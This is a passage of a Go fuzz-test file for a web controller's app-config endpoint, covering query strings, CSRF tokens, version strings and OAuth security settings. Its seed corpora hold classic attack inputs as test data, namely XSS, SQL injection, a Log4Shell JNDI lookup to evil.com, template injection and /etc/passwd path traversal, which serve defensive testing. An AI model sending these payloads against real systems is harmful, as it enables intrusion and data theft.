			DS:          mockDS,
			Settings:    settings,
			authService: nil,
		}

		// Build URL safely - query string must be URL-encoded
		url := "/api/v2/app/config"
		if queryString != "" {
			url += "?" + queryString
		}

		// httptest.NewRequest can panic on malformed URLs, so we need to handle that.
		// Panics from malformed input are acceptable in fuzzing as this tests
		// that the framework properly rejects malformed URLs.
		defer func() {
			_ = recover() // Suppress panic from malformed URLs
		}()

		req := httptest.NewRequest(http.MethodGet, url, http.NoBody)
		rec := httptest.NewRecorder()
		c := e.NewContext(req, rec)
		c.SetPath("/api/v2/app/config")

		// Should never panic (panics from httptest.NewRequest are caught above)
		err := controller.GetAppConfig(c)
		if err != nil {
			if _, ok := errors.AsType[*echo.HTTPError](err); !ok {
				t.Errorf("Unexpected error type: %T: %v", err, err)
			}
		}

		if rec.Code == http.StatusOK {
			var response map[string]any
			if jsonErr := json.Unmarshal(rec.Body.Bytes(), &response); jsonErr != nil {
				t.Errorf("Response is not valid JSON: %v", jsonErr)
			}
		}
	})
}

// FuzzGetAppConfig_CSRFToken fuzzes the CSRF token handling.
// Run with: go test -fuzz=FuzzGetAppConfig_CSRFToken -fuzztime=30s
func FuzzGetAppConfig_CSRFToken(f *testing.F) {
	// Add seed corpus
	f.Add("normal-token-123")
	f.Add("")
	f.Add("a")
	f.Add(string(make([]byte, 1000)))
	f.Add("token\x00with\x00nulls")
	f.Add("日本語トークン")
	f.Add("<script>alert('xss')</script>")
	f.Add("' OR '1'='1")
	f.Add("${jndi:ldap://evil.com/}")
	f.Add("{{7*7}}")
	f.Add("../../../etc/passwd")

	f.Fuzz(func(t *testing.T, csrfToken string) {
		e := echo.New()
		mockDS := mocks.NewMockInterface(t)
		settings := &conf.Settings{
			Version: "1.0.0-fuzz",
		}

		controller := &Controller{
			DS:          mockDS,
			Settings:    settings,
			authService: nil,
		}

		req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
		rec := httptest.NewRecorder()
		c := e.NewContext(req, rec)
		c.SetPath("/api/v2/app/config")
		c.Set("csrf", csrfToken)

		err := controller.GetAppConfig(c)
		if err != nil {
			t.Errorf("Unexpected error: %v", err)
		}

		if rec.Code != http.StatusOK {
			t.Errorf("Expected status 200, got %d", rec.Code)
		}

		var response AppConfigResponse
		if jsonErr := json.Unmarshal(rec.Body.Bytes(), &response); jsonErr != nil {
			t.Errorf("Response is not valid JSON: %v", jsonErr)
		}

		// For valid non-empty UTF-8 tokens, verify they are returned unchanged.
		// Empty tokens trigger EnsureCSRFToken to generate a new one.
		// Invalid UTF-8 sequences may be transformed by JSON encoding.
		if utf8.ValidString(csrfToken) && csrfToken != "" {
			if response.CSRFToken != csrfToken {
				t.Errorf("CSRF token mismatch for valid UTF-8: expected %q, got %q", csrfToken, response.CSRFToken)
			}
		} else if csrfToken == "" {
			// Empty input triggers token generation
			if response.CSRFToken == "" {
				t.Errorf("Expected generated token for empty input, got empty")
			}
		}
		// For invalid UTF-8, just ensure we get a non-empty response
		// (JSON encoding may replace invalid bytes with replacement characters)
	})
}

// FuzzGetAppConfig_Version fuzzes the version field handling.
// Run with: go test -fuzz=FuzzGetAppConfig_Version -fuzztime=30s
func FuzzGetAppConfig_Version(f *testing.F) {
	// Add seed corpus
	f.Add("1.0.0")
	f.Add("")
	f.Add("v2.3.4-rc.1+build.123")
	f.Add("Development Build (local)")
	f.Add("<script>alert('xss')</script>")
	f.Add(string(make([]byte, 10000)))
	f.Add("日本語バージョン")
	f.Add("version\x00with\x00nulls")

	f.Fuzz(func(t *testing.T, version string) {
		e := echo.New()
		mockDS := mocks.NewMockInterface(t)
		settings := &conf.Settings{
			Version: version,
		}

		controller := &Controller{
			DS:          mockDS,
			Settings:    settings,
			authService: nil,
		}

		req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
		rec := httptest.NewRecorder()
		c := e.NewContext(req, rec)
		c.SetPath("/api/v2/app/config")

		err := controller.GetAppConfig(c)
		if err != nil {
			t.Errorf("Unexpected error: %v", err)
		}

		if rec.Code != http.StatusOK {
			t.Errorf("Expected status 200, got %d", rec.Code)
		}

		var response AppConfigResponse
		if jsonErr := json.Unmarshal(rec.Body.Bytes(), &response); jsonErr != nil {
			t.Errorf("Response is not valid JSON: %v", jsonErr)
		}

		// For valid UTF-8 versions, verify they are returned unchanged.
		// Invalid UTF-8 sequences may be transformed by JSON encoding.
		if utf8.ValidString(version) {
			if response.Version != version {
				t.Errorf("Version mismatch for valid UTF-8: expected %q, got %q", version, response.Version)
			}
		}
	})
}

// fuzzSecurityInput holds the fuzz test input parameters for security config testing.
type fuzzSecurityInput struct {
	basicEnabled     bool
	googleEnabled    bool
	githubEnabled    bool
	microsoftEnabled bool
	host             string
}

// buildFuzzOAuthProviders constructs an OAuth providers array from fuzz input flags.
func buildFuzzOAuthProviders(input fuzzSecurityInput) []conf.OAuthProviderConfig {
	var providers []conf.OAuthProviderConfig

	if input.googleEnabled {
		providers = append(providers, conf.OAuthProviderConfig{
			Provider:     "google",
			Enabled:      true,
			ClientID:     "fuzz-google-client",
			ClientSecret: "fuzz-google-secret",
		})
	}
	if input.githubEnabled {
		providers = append(providers, conf.OAuthProviderConfig{
			Provider:     "github",
			Enabled:      true,
			ClientID:     "fuzz-github-client",
			ClientSecret: "fuzz-github-secret",
		})
	}
	if input.microsoftEnabled {
		providers = append(providers, conf.OAuthProviderConfig{
			Provider:     "microsoft",
			Enabled:      true,
			ClientID:     "fuzz-microsoft-client",
			ClientSecret: "fuzz-microsoft-secret",
		})
	}

	return providers
}

// verifyFuzzSecurityResponse verifies the response matches expected security configuration.
func verifyFuzzSecurityResponse(t *testing.T, response *AppConfigResponse, input fuzzSecurityInput, bodyStr string) {
	t.Helper()

	expectedEnabled := input.basicEnabled || input.googleEnabled || input.githubEnabled || input.microsoftEnabled
	if response.Security.Enabled != expectedEnabled {
		t.Errorf("Security.Enabled mismatch: expected %v, got %v", expectedEnabled, response.Security.Enabled)
	}

	if response.Security.AuthConfig.BasicEnabled != input.basicEnabled {
		t.Errorf("BasicEnabled mismatch: expected %v, got %v", input.basicEnabled, response.Security.AuthConfig.BasicEnabled)
	}

	verifyFuzzOAuthProviders(t, response, input)
	verifyFuzzHostNotExposed(t, bodyStr, input.host)
}

// verifyFuzzOAuthProviders checks that OAuth provider flags in response match input.
func verifyFuzzOAuthProviders(t *testing.T, response *AppConfigResponse, input fuzzSecurityInput) {
	t.Helper()

	hasProvider := func(provider string) bool {
		return slices.Contains(response.Security.AuthConfig.EnabledProviders, provider)
	}

	if hasProvider("google") != input.googleEnabled {
		t.Errorf("GoogleEnabled mismatch: expected %v, got %v", input.googleEnabled, hasProvider("google"))
	}
	if hasProvider("github") != input.githubEnabled {
		t.Errorf("GithubEnabled mismatch: expected %v, got %v", input.githubEnabled, hasProvider("github"))
	}
	if hasProvider("microsoft") != input.microsoftEnabled {
		t.Errorf("MicrosoftEnabled mismatch: expected %v, got %v", input.microsoftEnabled, hasProvider("microsoft"))
	}
}

// verifyFuzzHostNotExposed checks that the host is not exposed in the response body.
func verifyFuzzHostNotExposed(t *testing.T, bodyStr, host string) {
	t.Helper()

	if host != "" && strings.Contains(bodyStr, host) {
		t.Errorf("Host should not be exposed in response: %s", host)
	}
}

// FuzzGetAppConfig_SecurityConfig fuzzes the security configuration.
// Run with: go test -fuzz=FuzzGetAppConfig_SecurityConfig -fuzztime=30s
func FuzzGetAppConfig_SecurityConfig(f *testing.F) {
	// Add seed corpus (basicEnabled, googleEnabled, githubEnabled, microsoftEnabled, host)
	f.Add(false, false, false, false, "")
	f.Add(true, false, false, false, "localhost")
	f.Add(true, true, true, true, "example.com")
	f.Add(false, true, false, true, "日本語.com")
	f.Add(true, true, true, true, "<script>evil</script>")

	f.Fuzz(func(t *testing.T, basicEnabled, googleEnabled, githubEnabled, microsoftEnabled bool, host string) {
		input := fuzzSecurityInput{
			basicEnabled:     basicEnabled,
			googleEnabled:    googleEnabled,
			githubEnabled:    githubEnabled,
			microsoftEnabled: microsoftEnabled,
			host:             host,
		}

		e := echo.New()
		mockDS := mocks.NewMockInterface(t)

		settings := &conf.Settings{
			Version: "1.0.0-fuzz",
			Security: conf.Security{
				BasicAuth:      conf.BasicAuth{Enabled: input.basicEnabled},
				OAuthProviders: buildFuzzOAuthProviders(input),
				Host:           input.host,
			},
		}

		controller := &Controller{
			DS:          mockDS,
			Settings:    settings,
			authService: nil,
		}

		req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
		rec := httptest.NewRecorder()
		c := e.NewContext(req, rec)
		c.SetPath("/api/v2/app/config")

		if err := controller.GetAppConfig(c); err != nil {
			t.Errorf("Unexpected error: %v", err)
		}

		if rec.Code != http.StatusOK {
			t.Errorf("Expected status 200, got %d", rec.Code)
		}

		var response AppConfigResponse
		if jsonErr := json.Unmarshal(rec.Body.Bytes(), &response); jsonErr != nil {
			t.Errorf("Response is not valid JSON: %v", jsonErr)
		}

		verifyFuzzSecurityResponse(t, &response, input, rec.Body.String())
	})
}
